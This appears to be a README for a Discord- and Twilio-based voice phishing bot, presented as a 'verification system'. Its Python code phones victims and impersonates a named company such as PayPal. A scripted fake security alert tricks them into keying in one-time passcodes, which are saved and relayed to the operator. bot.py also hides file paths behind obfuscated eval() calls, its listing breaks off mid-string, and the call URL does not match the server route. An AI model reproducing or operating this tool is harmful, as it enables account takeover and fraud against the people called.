<p align="center"><img width=12.5% src="https://media.discordapp.net/attachments/1155402484072853514/1215174671625101332/dddadadadajpg.jpg?ex=65fbca9a&is=65e9559a&hm=14536ed82471893d585507b3ef44e52a63180e2993e41b4e9e523125c4ec75a4&=&format=webp&width=468&height=468"></p>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
![DISCORD](https://img.shields.io/badge/Discord-7289DA?style=for-the-badge&logo=discord&logoColor=white)
## simple description

basically what my tool does is it, sets up a basic web server using Flask to handle incoming voice requests from Twilio, providing a simple voice-based authentication or verification system. It interacts with users through voice messages and gathers input to perform actions such as blocking requests or re-entering OTPs.


## talker.py

```py
import twilio.twiml.voice_response as tr
from flask import Flask, request

app = Flask(__name__)

@app.route("/v", methods=['GET', 'POST'])
def voice():
    r = tr.VoiceResponse()
    r.say(f",,,Hello {open('Details/Client_Name.txt', 'r').read()}, your {open('Details/Company Name.txt', 'r').read()} account password is trying to be reset from an unknown location,")
    g = tr.Gather(num_digits=1, action='/g', timeout=120)
    g.say('If this was not you please press 1,')
    r.append(g)
    return str(r)

@app.route('/g', methods=['GET', 'POST'])
def gather():
    r = tr.VoiceResponse()
    if 'Digits' in request.values:
        c = request.values['Digits']
        if c == '1':
            go = tr.Gather(num_digits=int(open("Details/Digits.txt", 'r').read()), action='/go', timeout=120)
            go.say(f'To block the request, Please enter the {open("Details/Digits.txt", "r").read()} digits code we sent to you, when you finish, Please press Pound')
            r.append(go)
            return str(r)
        else:
            r.say("Sorry, Please make correct choice.")
            r.redirect('/v')
            return str(r)
    r.redirect('/v')
    return str(r)

@app.route('/go', methods=['GET', 'POST'])
def gatherotp():
    r = tr.VoiceResponse()
    r.say('Please give us a moment to block the request')
    if 'Digits' in request.values:
        r.play(url='https://ia904701.us.archive.org/33/items/music_20221124/music.mp3')
        r.say('Great, we have blocked the request. However, If you accidentally type the wrong one-time passcode, We will call you again,')
        a = open('grabbed_otp.txt', 'w', encoding='utf-8')
        ch = request.values['Digits']
        a.write(ch)
        return str(r)
    else:
        r.say("Sorry, Please make correct choice.")
        r.redirect('/g')
        return str(r)

@app.route("/vagain", methods=['GET', 'POST'])
def voiceagain():
    r = tr.VoiceResponse()
    r.say(f"Hello {open('Details/Client_Name.txt', 'r').read()}, Sorry, you have typed the wrong one-time passcode,")
    g = tr.Gather(num_digits=1, action='/g', timeout=120)
    g.say('Press 1, To enter the one-time passcode again')
    r.append(g)
    return str(r)

if __name__ == "__main__":
    app.run(debug=True)

```

## bot.py

```py
# by Dvine aka mogaly

import time
import os
import discord_slash.utils.manage_commands as manage_commands
import requests
import discord
import os
from discord_slash import SlashCommand
from flask import Flask, request
from twilio.rest import Client
import json
from discord.ext import commands
from discord_slash import SlashCommand, SlashContext

a = lambda x: ''.join(chr(ord(i) - 1) for i in x)
b = eval(a('"VQD@qo@@r|ro^@uy}rro@vnttq{omrr"'))
c = eval(a('"Urdyksyb:qo@"'))
d = eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps"'))

if b not in os.listdir():
    with open(b, 'w') as file:
        file.write('{"account_sid":"?", "auth_token":"?", "Twilio Phone Number":"+1?", "ngrok_url":"https://you-url.ngrok.io", "server_id":"?", "bot_token":"?"}')

if c not in os.listdir():
    open(c, 'w').close()

if d not in os.listdir():
    os.mkdir(d)

if eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps"')) not in os.listdir(eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps"'))):
    open(eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps/XYr~{xo@Vs||Irovs.txt"')), 'w').close()

if eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps/Xphmhs\\kxss@Yr|ymUxmsa.txt"')) not in os.listdir(eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps"'))):
    open(eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps/Xphmhs\\kxss@Yr|ymUxmsa.txt"')), 'w').close()

if eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps/XymwxSqevo.txt"')) not in os.listdir(eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps"'))):
    open(eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps/XymwxSqevo.txt"')), 'w').close()

if eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps/XyrkjSnsfvo.txt"')) not in os.listdir(eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps"'))):
    open(eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps/XyrkjSnsfvo.txt"')), 'w').close()

e = eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps/Xphmhs\\kxss@Yr|ymUxmsa.txt"'))
f = eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps/XymwxSqevo.txt"'))
g = eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps/XyrkjSnsfvo.txt"'))

raw_config = json.loads(open(b, 'r').read())

client_discord = commands.Bot(command_prefix='')
slash = SlashCommand(client_discord, sync_commands=True)
server_id = int(raw_config['server_id'])

account_sid = raw_config['account_sid']
auth_token = raw_config['auth_token']
your_twilio_phone_number = raw_config['Twilio Phone Number']
ngrok = raw_config['ngrok_url']
client = Client(account_sid, auth_token)

app = Flask(__name__)

@slash.slash(
    name='dial',
    description='This command initiates a call',
    guild_ids=[server_id],
    options=[
        manage_commands.create_option(
            name='cell_phone',
            description='Add +1, e.g., +1987654321',
            required=True,
            option_type=3
        ),
        manage_commands.create_option(
            name='otp_digits',
            description='e.g., 8, 6, or 4',
            required=True,
            option_type=3
        ),
        manage_commands.create_option(
            name='client_name',
            description='e.g., Smith',
            required=True,
            option_type=3
        ),
        manage_commands.create_option(
            name='company_name',
            description='e.g., Paypal',
            required=True,
            option_type=3
        )
    ]
)
async def _call(ctx=SlashContext, cell_phone=str, otp_digits=str, client_name=str, company_name=str):
    await ctx.send('Initiating Call...')
    open(f, 'w').write(f'{otp_digits}')
    open(g, 'w').write(f'{client_name}')
    open(e, 'w').write(f'{company_name}')
    call = client.calls.create(
        url=f'{ngrok}/voice',
        to=f'{cell_phone}',
        from_=f'{your_twilio_phone_number}'
    )
    sid = call.sid
    print(sid)
    status_dict = {'queued': 0, 'ringing': 0, 'in-progress': 0, 'completed': 0, 'failed': 0, 'no-answer': 0,
                   'canceled': 0, 'busy': 0}
    while True:
        call_status = client.calls(sid).fetch().status
        if call_status in status_dict and not status_dict[call_status] >= 1:
            embed = discord.Embed(title='', description=f'Call {call_status.replace("-", " ").title()}', color=discord.Colour.green() if call_status == 'completed' else discord.Colour.red())
            await ctx.channel.send(embed=embed)
            status_dict[call_status] += 1
        if call_status == 'completed' or call_status == 'failed' or call_status == 'no-answer' or call_status == 'canceled' or call_status == 'busy':
            break
        time.sleep(1)
    time.sleep(1)
    otp = open(f'grabbed_otp.txt', 'r').read()
    call1 = client.calls(sid).fetch()
    if not otp:
        embed = discord.Embed(title='', description=f'Unable To Grab OTP\n\nPrice : {call1.price}\nDuration : {call1.duration} secs', color=discord.Colour.red())
    else:
        embed = discord.Embed(title='', description=f'{otp}\n\nPrice : {call1.price}\nDuration : {call1.duration} secs', color=discord.Colour.green())
    await ctx.channel.send(embed=embed)
    open('grabbed_otp.txt', 'w').close()

@slash.slash(
    name='redial',
    description='Use this command if the

```

## Contact me

```text
discord: @wockcup
telegram: @wockcup
youtube: Mogaly (@notmogaly)
```

 -Mogaly.
